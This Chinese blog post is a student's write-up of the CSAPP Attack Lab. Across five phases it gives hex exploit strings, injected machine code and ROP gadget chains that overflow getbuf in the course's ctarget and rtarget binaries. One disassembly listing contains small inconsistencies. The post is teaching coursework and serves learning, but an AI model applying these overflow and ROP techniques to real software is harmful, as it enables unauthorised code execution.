---
layout: "../../layouts/PostLayout.astro"
title: "CSAPP attack lab记录"
pubDate: "2023.6.27"
heroImage: "/images/cover2.png"
tags: ["CS自学记录"]
---

![image-20230625111437259](https://cdn.jsdelivr.net/gh/Real-Rio/pictures/img/image-20230625111437259.png)

Both CTARGET and RTARGET take several different command line arguments:
-h: Print list of possible command line arguments
-q: Don’t send results to the grading server(自学者需要加上，否则报错)
-i FILE: Supply input from a file, rather than from standard input



## Phase1 

```c
void test()
{
int val;
val = getbuf();
printf("No exploit. Getbuf returned 0x%x\n", val);
}

void touch1()
{
vlevel = 1; /* Part of validation protocol */
printf("Touch1!: You called touch1()\n");
validate(1);
exit(0);
}
```

在test函数中会调用getbuf函数，目标是使得getbuf函数在返回时进入touch1函数中，这就需要更改getbuf函数的返回地址为touch1的地址

```asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq  
```

首先使用`objdump -d ctarget`指令将ctarget文件反汇编，注意到touch1函数的地址为`0x4017c0`,test函数中调用getbuf的下一行命令地址为`0x401976`，故只需在gdb中观察getbuf栈帧，`0x401976`处即为应修改返回地址的地方

![image-20230625121228141](https://cdn.jsdelivr.net/gh/Real-Rio/pictures/img/image-20230625121228141.png)

输入字符串`123456`后用gdb查看rsp开始的64个字节，发现输入字符串从rsp处开始，返回地址位于`rsp+40`处，那么思路为：构造字符串前40个字节任意（不为0），第41～44个字节为`c0 17 40 00`

在string.txt中保存构造字符串（16进制）

```
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
c0 17 40 00 00 00 00 00
```

使用命令`./hex2raw < string.txt | ./ctarget -q`成功通过phase1



## Phase2 

```c
void touch2(unsigned val)
{
  vlevel = 2; /* Part of validation protocol */
  if (val == cookie) {
  printf("Touch2!: You called touch2(0x%.8x)\n", val);
  validate(2);
} else {
  printf("Misfire: You called touch2(0x%.8x)\n", val);
  fail(2);
 }
 	exit(0);
 }
```

与phase1类似，需要从getbuf函数返回到touch2函数执行，但需要注意的是，touch2中会将参数val与cookie比较，因此我们在进入touch2函数之前需要用一段程序修改参数为cookie值，注意，第一个参数保存在edi寄存器中

存放这段程序的位置可以是phase1中rsp到返回地址之间的40个字节处

```asm
(gdb) p/x cookie
$4 = 0x59b997fa # cookie的值

00000000004017ec <touch2> # touch2地址
```

编写汇编程序后使用`gcc -c phase2-snippet.s`进行汇编，再使用`objdump -d phase2-snippet.o`命令反汇编得到机器码

```asm
# 编写汇编程序为
mov $0x59b997fa,%edi # 将edi设为cookie
push $0x004017ec # 将touch2的返回地址压入栈中，随后返回
ret
# 机器码为
0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
5:   68 ec 17 40 00          pushq  $0x4017ec
a:   c3                      retq 
```

构造字符串（16进制）为

```
bf fa 97 b9 59 68 ec 17
40 00 c3 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
78 dc 61 55 00 00 00 00 # 0x5561dc78即为我们编写程序的起始位置
```



## Phase3 

与phase2类似，phase3在转入touch3函数执行时会进行参数的比较，只不过参数从整型变成了字符串类型，需要将edi寄存器的值改为参数字符串的起始地址

```asm
# 编写汇编程序为
push $0x61663739
push $0x39623935 # 将cookie的ascii码压入栈中
mov %esp,%edi
push $0x004018fa # 将touch3的返回地址压入栈中，随后返回
ret

# 反汇编为
0:   68 39 37 66 61          pushq  $0x61663739
5:   68 35 39 62 39          pushq  $0x39623935
a:   89 e7                   mov    %esp,%edi
c:   68 fa 18 40 00          pushq  $0x4017ec
11:   c3                      retq             
```

构造16进制字符串如下：

```
68 39 37 66 61 68 35 39
62 39 89 e7 68 fa 18 40 
00 c3 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
78 dc 61 55 00 00 00 00
```

<img src="https://cdn.jsdelivr.net/gh/Real-Rio/pictures/img/image-20230625173959059.png" alt="image-20230625173959059" style="zoom:50%;" />

第一次提交显示失败，猜测是存放cookie的栈空间被污染，尝试将cookie保存在`0x5561dca8`处

![image-20230625121228141](https://cdn.jsdelivr.net/gh/Real-Rio/pictures/img/image-20230625121228141.png)

修改后的代码如下

```asm
mov $0x5561dca8,%rdi
push $0x004018fa # 将touch3的返回地址压入栈中，随后返回
ret

#反汇编
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq                     retq   
```

构造16进制字符串为

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 # cookie的16进制ascii码
```



## Phase4 

Phase4开始升级难度，栈启用随机化使得程序加载的位置不固定，同时栈上数据不可执行，像之前关卡利用缓冲区溢出将程序放在栈上执行的做法就不可用了

ROP攻击的思想是利用程序中已有的代码片段，将它们像串珠子一样拼装成可以被我们利用的完整程序

Phase4目标和Phase2类似，都是从getbuf返回到touch2函数，同时传入参数即edi寄存器设为cookie值

```asm
(gdb) p cookie
$1 = 1505335290
(gdb) p/x cookie
$2 = 0x59b997fa
```

因为栈不可执行，cookie值不可能使用汇编程序赋值给edi寄存器，唯一的方法是输入字符串时将cookie值保存在栈上，随后使用gadget中的pop命令将栈上数据弹出到寄存器。首先使用命令`objdump -d rtarget > temp.txt`将程序反汇编

<img src="https://cdn.jsdelivr.net/gh/Real-Rio/pictures/img/image-20230625211435282.png" alt="image-20230625211435282" style="zoom:50%;" />

<img src="https://cdn.jsdelivr.net/gh/Real-Rio/pictures/img/image-20230625211825779.png" alt="image-20230625211825779" style="zoom:50%;" />在vscode中打开反汇编的文本文件，使用`ctrl+f`搜索功能重点寻找58～5f之间的命令。在下图中可以看到一个gadget`58 90 c3`，对应的汇编为`pop %rax;nop;ret`

<img src="https://cdn.jsdelivr.net/gh/Real-Rio/pictures/img/image-20230625211530662.png" alt="image-20230625211530662" style="zoom:50%;" />

因为目标是将cookie赋值给rdi寄存器，需要一条`movl %eax,%edi`命令，正好在下图所示位置找到

<img src="https://cdn.jsdelivr.net/gh/Real-Rio/pictures/img/image-20230625211735916.png" alt="image-20230625211735916" style="zoom:50%;" />

通过phase2中分析可知，在getbuf返回地址离输入字符串相距40个字节，且getbuf返回时rsp指向返回地址处，我们设计的逻辑链为getbuf->(pop rax)->(mov eax,edi)->touch2

从返回地址处开始的栈分布如下图所示：

<img src="https://cdn.jsdelivr.net/gh/Real-Rio/pictures/img/image-20230625230117698.png" alt="image-20230625230117698" style="zoom:50%;" />

这里需要注意x86-64中每次pop，rsp都会增加8个字节



## Phase5 

与phase4类似，只不过不是将cookie的值赋给edi，而是将cookie字符串在栈中的地址赋给edi。思路是类似`mov esp,edi;pop ebx;ret;`的汇编语句，将cookie的地址也即esp所指的单元赋值给edi，随后使用pop使得esp指向下一个栈单元，该栈单元存储着touch3的首地址，此时一条ret命令即可将程序返回到touch3中

![image-20230625232919874](https://cdn.jsdelivr.net/gh/Real-Rio/pictures/img/image-20230625232919874.png)

然而搜索farm.c中片段发现，源操作数为esp的movl指令后往往跟的是ret指令，也就是说我们不能让栈指针指向下一个地址单元再返回

![image-20230627154656634](https://cdn.jsdelivr.net/gh/Real-Rio/pictures/img/image-20230627154656634.png)

因此我们需要转换思路，cookie ascii的地址不能一次保存到edi中，那就分两次保存。正好有如下的代码片段`rax=rdi+rsi`，我们可以将esp保存到rdi中，将cookie ascii码离esp的偏移量保存到rsi中，两个相加就可得到ascii码的绝对地址

```asm
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3   
```

最后字符串的安排如下

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00  <-- movq %rsp, %rax
c5 19 40 00 00 00 00 00  <-- movq %rax, %rdi
ab 19 40 00 00 00 00 00  <-- popq %rax
48 00 00 00 00 00 00 00  <-- 偏移量
42 1a 40 00 00 00 00 00  <-- movl %eax, %edx
34 1a 40 00 00 00 00 00  <-- movl %edx, %ecx
27 1a 40 00 00 00 00 00  <-- movl %ecx, %esi
d6 19 40 00 00 00 00 00  <-- lea  (%rdi,%rsi,1),%rax
c5 19 40 00 00 00 00 00  <-- movq %rax, %rdi
fa 18 40 00 00 00 00 00  <-- touch3地址
35 39 62 39 39 37 66 61  <-- cookie ascii码
00 00 00 00 00 00 00 00  <-- Null terminator
```

- cookie值需要放到最后，因为字符串的末尾应该是`00`
- 执行第一条语句`movq rsp,rax`时，此时的rsp指向下一条语句，因此到cookie ascii的偏移量为72个字节
